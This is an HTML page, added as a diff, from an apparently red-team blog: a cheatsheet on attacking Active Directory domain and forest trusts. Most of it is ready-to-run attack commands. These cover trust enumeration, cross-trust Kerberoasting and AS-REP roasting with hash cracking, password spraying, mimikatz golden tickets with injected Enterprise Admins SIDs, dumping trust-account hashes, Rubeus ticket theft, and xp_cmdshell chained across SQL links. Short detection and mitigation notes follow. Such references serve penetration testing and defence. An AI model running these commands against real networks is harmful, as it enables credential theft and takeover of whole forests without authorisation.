@@ -1,0 +1,363 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="Domain-Trust-Exploitation"><a href="#Domain-Trust-Exploitation" class="headerlink" title="Domain Trust Exploitation"></a>Domain Trust Exploitation</h1><p>Enumerate and exploit trust relationships between domains and forests to move laterally across trust boundaries.<br>Trust attacks allow attackers to pivot between domains and forests, often bypassing security boundaries.</p>
+<h2 id="Quick-Reference"><a href="#Quick-Reference" class="headerlink" title="Quick Reference"></a>Quick Reference</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Enumerate trusts with PowerView</span></span><br><span class="line"><span class="built_in">Get-DomainTrust</span></span><br><span class="line"><span class="built_in">Get-ForestTrust</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Map trust relationships</span></span><br><span class="line"><span class="built_in">Invoke-MapDomainTrust</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Kerberoast across trust</span></span><br><span class="line">GetUserSPNs.py <span class="literal">-target-domain</span> TRUSTED.LOCAL domain.local/user:password</span><br></pre></td></tr></table></figure>
+
+<h2 id="Trust-Types"><a href="#Trust-Types" class="headerlink" title="Trust Types"></a>Trust Types</h2><table>
+<thead>
+<tr>
+<th>Trust Type</th>
+<th>Description</th>
+<th>Transitivity</th>
+<th>Direction</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Parent-Child</td>
+<td>Between parent and child domain in same forest</td>
+<td>Transitive</td>
+<td>Two-way</td>
+</tr>
+<tr>
+<td>Tree-Root</td>
+<td>Between root domains of trees in same forest</td>
+<td>Transitive</td>
+<td>Two-way</td>
+</tr>
+<tr>
+<td>External</td>
+<td>Between domains in different forests</td>
+<td>Non-transitive</td>
+<td>One-way or two-way</td>
+</tr>
+<tr>
+<td>Forest</td>
+<td>Between root domains of different forests</td>
+<td>Transitive</td>
+<td>One-way or two-way</td>
+</tr>
+<tr>
+<td>Shortcut</td>
+<td>Between child domains in same forest</td>
+<td>Transitive</td>
+<td>One-way or two-way</td>
+</tr>
+<tr>
+<td>Realm</td>
+<td>Between Windows domain and non-Windows Kerberos realm</td>
+<td>Transitive or non-transitive</td>
+<td>One-way or two-way</td>
+</tr>
+</tbody></table>
+<h2 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h2><h3 id="PowerView-Trust-Enumeration"><a href="#PowerView-Trust-Enumeration" class="headerlink" title="PowerView Trust Enumeration"></a>PowerView Trust Enumeration</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Import PowerView</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enumerate domain trusts</span></span><br><span class="line"><span class="built_in">Get-DomainTrust</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enumerate forest trusts</span></span><br><span class="line"><span class="built_in">Get-ForestTrust</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get detailed trust information</span></span><br><span class="line"><span class="built_in">Get-DomainTrust</span> <span class="literal">-Domain</span> domain.local</span><br><span class="line"></span><br><span class="line"><span class="comment"># Map all trusts</span></span><br><span class="line"><span class="built_in">Invoke-MapDomainTrust</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enumerate foreign group memberships</span></span><br><span class="line"><span class="built_in">Get-DomainForeignGroupMember</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Enumerate foreign users</span></span><br><span class="line"><span class="built_in">Get-DomainForeignUser</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Native-Windows-Commands"><a href="#Native-Windows-Commands" class="headerlink" title="Native Windows Commands"></a>Native Windows Commands</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># List domain trusts</span><br><span class="line">nltest /domain_trusts</span><br><span class="line"></span><br><span class="line"># List all trusts</span><br><span class="line">nltest /domain_trusts /all_trusts</span><br><span class="line"></span><br><span class="line"># Query specific domain</span><br><span class="line">nltest /dsgetdc:domain.local /force</span><br><span class="line"></span><br><span class="line"># PowerShell</span><br><span class="line">Get-ADTrust -Filter *</span><br></pre></td></tr></table></figure>
+
+<h3 id="BloodHound-Trust-Mapping"><a href="#BloodHound-Trust-Mapping" class="headerlink" title="BloodHound Trust Mapping"></a>BloodHound Trust Mapping</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Collect with SharpHound including trusts</span></span><br><span class="line">.\SharpHound.exe <span class="literal">-c</span> All,Trusts <span class="literal">--zipfilename</span> bloodhound_trusts.zip</span><br><span class="line"></span><br><span class="line"><span class="comment"># In BloodHound, run queries:</span></span><br><span class="line"><span class="comment"># - Map Domain Trusts</span></span><br><span class="line"><span class="comment"># - Shortest Paths to Domain from Foreign Domain</span></span><br><span class="line"><span class="comment"># - Find Principals with DCSync Rights in Foreign Domain</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Cross-Domain-Attacks"><a href="#Cross-Domain-Attacks" class="headerlink" title="Cross-Domain Attacks"></a>Cross-Domain Attacks</h2><h3 id="Kerberoasting-Across-Trusts"><a href="#Kerberoasting-Across-Trusts" class="headerlink" title="Kerberoasting Across Trusts"></a>Kerberoasting Across Trusts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># List SPNs in trusted domain</span></span><br><span class="line">GetUserSPNs.py -target-domain TRUSTED.LOCAL domain.local/user:password</span><br><span class="line"></span><br><span class="line"><span class="comment"># Request TGS tickets</span></span><br><span class="line">GetUserSPNs.py -target-domain TRUSTED.LOCAL domain.local/user:password -request</span><br><span class="line"></span><br><span class="line"><span class="comment"># Crack tickets</span></span><br><span class="line">hashcat -m 13100 tgs_trusted.txt /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<h3 id="ASREP-Roasting-Across-Trusts"><a href="#ASREP-Roasting-Across-Trusts" class="headerlink" title="ASREP Roasting Across Trusts"></a>ASREP Roasting Across Trusts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ASREP roast in trusted domain</span></span><br><span class="line">GetNPUsers.py TRUSTED.LOCAL/ -dc-ip 10.10.10.20 -usersfile users.txt -no-pass</span><br><span class="line"></span><br><span class="line"><span class="comment"># With credentials</span></span><br><span class="line">GetNPUsers.py TRUSTED.LOCAL/user:password -dc-ip 10.10.10.20 -request</span><br></pre></td></tr></table></figure>
+
+<h3 id="Password-Spraying-Across-Trusts"><a href="#Password-Spraying-Across-Trusts" class="headerlink" title="Password Spraying Across Trusts"></a>Password Spraying Across Trusts</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Spray passwords in trusted domain</span></span><br><span class="line">nxc smb 10.10.20.0/24 -u users.txt -p <span class="string">&#x27;Password123&#x27;</span> -d TRUSTED.LOCAL --continue-on-success</span><br></pre></td></tr></table></figure>
+
+<h2 id="Parent-Child-Trust-Attacks"><a href="#Parent-Child-Trust-Attacks" class="headerlink" title="Parent-Child Trust Attacks"></a>Parent-Child Trust Attacks</h2><h3 id="ExtraSids-Attack-SID-History-Injection"><a href="#ExtraSids-Attack-SID-History-Injection" class="headerlink" title="ExtraSids Attack (SID History Injection)"></a>ExtraSids Attack (SID History Injection)</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Get child domain SID</span></span><br><span class="line"><span class="built_in">Get-DomainSID</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get parent domain SID</span></span><br><span class="line"><span class="built_in">Get-DomainSID</span> <span class="literal">-Domain</span> parent.local</span><br><span class="line"></span><br><span class="line"><span class="comment"># Create Golden Ticket with Enterprise Admins SID</span></span><br><span class="line">.\mimikatz.exe</span><br><span class="line">mimikatz <span class="comment"># kerberos::golden /user:Administrator /domain:child.parent.local /sid:S-1-5-21-CHILD-SID /sids:S-1-5-21-PARENT-SID-519 /krbtgt:krbtgt_hash /ptt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Access parent domain</span></span><br><span class="line"><span class="built_in">dir</span> \\parent<span class="literal">-dc</span>\c<span class="variable">$</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Compromise-Child-to-Compromise-Parent"><a href="#Compromise-Child-to-Compromise-Parent" class="headerlink" title="Compromise Child to Compromise Parent"></a>Compromise Child to Compromise Parent</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Compromise child domain</span><br><span class="line">2. Extract krbtgt hash from child DC</span><br><span class="line">3. Create Golden Ticket with Enterprise Admins SID</span><br><span class="line">4. Access parent domain resources</span><br><span class="line">5. DCSync parent domain</span><br></pre></td></tr></table></figure>
+
+<h2 id="Forest-Trust-Attacks"><a href="#Forest-Trust-Attacks" class="headerlink" title="Forest Trust Attacks"></a>Forest Trust Attacks</h2><h3 id="Trust-Account-Attack"><a href="#Trust-Account-Attack" class="headerlink" title="Trust Account Attack"></a>Trust Account Attack</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Dump trust account password</span></span><br><span class="line">secretsdump.py domain.local/user:password@dc.domain.local -just-dc-user <span class="string">&#x27;TRUSTED$&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Use trust account hash</span></span><br><span class="line">getTGT.py TRUSTED.LOCAL/TRUSTED$ -hashes :trust_hash</span><br><span class="line"></span><br><span class="line"><span class="comment"># Request TGS for service in trusted forest</span></span><br><span class="line">getST.py TRUSTED.LOCAL/TRUSTED$ -hashes :trust_hash -spn cifs/dc.trusted.local</span><br></pre></td></tr></table></figure>
+
+<h3 id="SID-History-Injection-Across-Forests"><a href="#SID-History-Injection-Across-Forests" class="headerlink" title="SID History Injection Across Forests"></a>SID History Injection Across Forests</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Requires compromised trust account</span></span><br><span class="line"><span class="comment"># Create ticket with SID history</span></span><br><span class="line">.\mimikatz.exe</span><br><span class="line">mimikatz <span class="comment"># kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-DOMAIN-SID /sids:S-1-5-21-TRUSTED-SID-500 /rc4:trust_hash /service:krbtgt /target:trusted.local /ptt</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Unconstrained-Delegation-Across-Trusts"><a href="#Unconstrained-Delegation-Across-Trusts" class="headerlink" title="Unconstrained Delegation Across Trusts"></a>Unconstrained Delegation Across Trusts</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Find computers with unconstrained delegation</span></span><br><span class="line"><span class="built_in">Get-DomainComputer</span> <span class="literal">-Unconstrained</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Monitor for TGTs</span></span><br><span class="line">.\Rubeus.exe monitor /interval:<span class="number">5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Coerce authentication from trusted domain</span></span><br><span class="line"><span class="comment"># Use printer bug or other coercion technique</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract TGT and use for access</span></span><br><span class="line">.\Rubeus.exe ptt /ticket:ticket.kirbi</span><br></pre></td></tr></table></figure>
+
+<h2 id="Foreign-Security-Principals"><a href="#Foreign-Security-Principals" class="headerlink" title="Foreign Security Principals"></a>Foreign Security Principals</h2><h3 id="Enumerate-Foreign-Principals"><a href="#Enumerate-Foreign-Principals" class="headerlink" title="Enumerate Foreign Principals"></a>Enumerate Foreign Principals</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Find foreign group members</span></span><br><span class="line"><span class="built_in">Get-DomainForeignGroupMember</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Find foreign users in local groups</span></span><br><span class="line"><span class="built_in">Get-DomainGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> | ? &#123;<span class="variable">$_</span>.MemberName <span class="operator">-like</span> <span class="string">&#x27;*S-1-5-21*&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enumerate ACLs with foreign principals</span></span><br><span class="line"><span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-ResolveGUIDs</span> | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-match</span> <span class="string">&#x27;^S-1-5-21-(?!CURRENT-DOMAIN-SID)&#x27;</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Abuse-Foreign-Group-Memberships"><a href="#Abuse-Foreign-Group-Memberships" class="headerlink" title="Abuse Foreign Group Memberships"></a>Abuse Foreign Group Memberships</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Identify user in trusted domain with admin rights in current domain</span><br><span class="line">2. Compromise user in trusted domain</span><br><span class="line">3. Use credentials to access current domain</span><br><span class="line">4. Escalate privileges using group membership</span><br></pre></td></tr></table></figure>
+
+<h2 id="SQL-Server-Link-Attacks-Across-Trusts"><a href="#SQL-Server-Link-Attacks-Across-Trusts" class="headerlink" title="SQL Server Link Attacks Across Trusts"></a>SQL Server Link Attacks Across Trusts</h2><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- Enumerate SQL Server links</span></span><br><span class="line"><span class="keyword">EXEC</span> sp_linkedservers</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Execute commands across link</span></span><br><span class="line"><span class="keyword">EXEC</span> (<span class="string">&#x27;xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;</span>) <span class="keyword">AT</span> [LINKED_SERVER]</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Chain links across trusts</span></span><br><span class="line"><span class="keyword">EXEC</span> (<span class="string">&#x27;EXEC (&#x27;&#x27;xp_cmdshell &#x27;&#x27;&#x27;&#x27;whoami&#x27;&#x27;&#x27;&#x27;&#x27;&#x27;) AT [REMOTE_SERVER]&#x27;</span>) <span class="keyword">AT</span> [LINKED_SERVER]</span><br></pre></td></tr></table></figure>
+
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><h3 id="Trust-Direction"><a href="#Trust-Direction" class="headerlink" title="Trust Direction"></a>Trust Direction</h3><ul>
+<li><strong>One-way trust</strong>: Domain A trusts Domain B<ul>
+<li>Users in B can access resources in A</li>
+<li>Users in A cannot access resources in B</li>
+</ul>
+</li>
+<li><strong>Two-way trust</strong>: Domains trust each other<ul>
+<li>Users in both domains can access resources in the other</li>
+</ul>
+</li>
+</ul>
+<h3 id="Trust-Transitivity"><a href="#Trust-Transitivity" class="headerlink" title="Trust Transitivity"></a>Trust Transitivity</h3><ul>
+<li><strong>Transitive</strong>: Trust extends beyond two domains<ul>
+<li>If A trusts B and B trusts C, then A trusts C</li>
+</ul>
+</li>
+<li><strong>Non-transitive</strong>: Trust limited to two domains<ul>
+<li>If A trusts B and B trusts C, A does NOT trust C</li>
+</ul>
+</li>
+</ul>
+<h3 id="SID-Filtering"><a href="#SID-Filtering" class="headerlink" title="SID Filtering"></a>SID Filtering</h3><p>SID filtering prevents SID history attacks across forest trusts:</p>
+<ul>
+<li>Enabled by default on external trusts</li>
+<li>Disabled by default on forest trusts</li>
+<li>Can be bypassed with specific techniques (CVE-2020-0665)</li>
+</ul>
+<h3 id="Common-Attack-Paths"><a href="#Common-Attack-Paths" class="headerlink" title="Common Attack Paths"></a>Common Attack Paths</h3><p><strong>Scenario 1: Child to Parent</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Compromise child domain</span><br><span class="line">2. Extract krbtgt hash</span><br><span class="line">3. Create Golden Ticket with Enterprise Admins SID</span><br><span class="line">4. Access parent domain</span><br></pre></td></tr></table></figure>
+
+<p><strong>Scenario 2: Forest to Forest</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Compromise user in Forest A</span><br><span class="line">2. Kerberoast service accounts in Forest B</span><br><span class="line">3. Crack service account password</span><br><span class="line">4. Use service account for lateral movement in Forest B</span><br></pre></td></tr></table></figure>
+
+<p><strong>Scenario 3: Foreign Group Abuse</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Identify foreign security principal with admin rights</span><br><span class="line">2. Compromise account in trusted domain</span><br><span class="line">3. Use credentials to access current domain</span><br><span class="line">4. Escalate privileges</span><br></pre></td></tr></table></figure>
+
+<h3 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h3><p>Trust attacks generate:</p>
+<ul>
+<li>Event ID 4768 (TGT requested) from foreign domain</li>
+<li>Event ID 4769 (TGS requested) for foreign domain services</li>
+<li>Event ID 4624 (Logon) from foreign domain users</li>
+<li>Unusual cross-domain authentication patterns</li>
+<li>SID history in tickets (Event ID 4769)</li>
+</ul>
+<h3 id="Mitigation-Recommendations"><a href="#Mitigation-Recommendations" class="headerlink" title="Mitigation Recommendations"></a>Mitigation Recommendations</h3><p>For clients:</p>
+<ul>
+<li>Minimize trust relationships</li>
+<li>Use selective authentication on forest trusts</li>
+<li>Enable SID filtering on external trusts</li>
+<li>Monitor cross-domain authentication</li>
+<li>Implement tiered administration across trusts</li>
+<li>Regular trust audits</li>
+<li>Disable unconstrained delegation</li>
+<li>Use Protected Users group</li>
+<li>Implement network segmentation between forests</li>
+<li>Monitor Event IDs 4768, 4769, 4624 for cross-domain activity</li>
+</ul>
+<h3 id="Trust-Security-Boundaries"><a href="#Trust-Security-Boundaries" class="headerlink" title="Trust Security Boundaries"></a>Trust Security Boundaries</h3><ul>
+<li><strong>Forest is the security boundary</strong>, not the domain</li>
+<li>Compromising any domain in a forest &#x3D; compromising entire forest</li>
+<li>Forest trusts should be treated as high-risk</li>
+<li>External trusts are more secure than forest trusts (SID filtering)</li>
+</ul>
+<h3 id="BloodHound-Trust-Queries"><a href="#BloodHound-Trust-Queries" class="headerlink" title="BloodHound Trust Queries"></a>BloodHound Trust Queries</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Find shortest path from current domain to foreign domain</span><br><span class="line">MATCH p=shortestPath((u:User &#123;domain:&quot;CURRENT.LOCAL&quot;&#125;)-[*1..]-&gt;(g:Group &#123;domain:&quot;TRUSTED.LOCAL&quot;&#125;))</span><br><span class="line">RETURN p</span><br><span class="line"></span><br><span class="line">// Find foreign admins</span><br><span class="line">MATCH (u:User)-[:MemberOf*1..]-&gt;(g:Group &#123;name:&quot;DOMAIN ADMINS@TRUSTED.LOCAL&quot;&#125;)</span><br><span class="line">WHERE u.domain &lt;&gt; &quot;TRUSTED.LOCAL&quot;</span><br><span class="line">RETURN u</span><br><span class="line"></span><br><span class="line">// Find cross-domain ACLs</span><br><span class="line">MATCH p=(u:User)-[r:GenericAll|GenericWrite|WriteDacl|WriteOwner]-&gt;(n)</span><br><span class="line">WHERE u.domain &lt;&gt; n.domain</span><br><span class="line">RETURN p</span><br></pre></td></tr></table></figure>
+
+<h3 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://harmj0y.medium.com/a-guide-to-attacking-domain-trusts-ef5f8992bb9d">Harmj0y - A Guide to Attacking Domain Trusts</a></li>
+<li><a target="_blank" rel="noopener" href="https://academy.hackthebox.com/module/details/147">HTB Academy - Active Directory Trust Attacks</a></li>
+<li><a target="_blank" rel="noopener" href="https://posts.specterops.io/not-a-security-boundary-breaking-forest-trusts-cd125829518d">SpecterOps - Not A Security Boundary: Breaking Forest Trusts</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
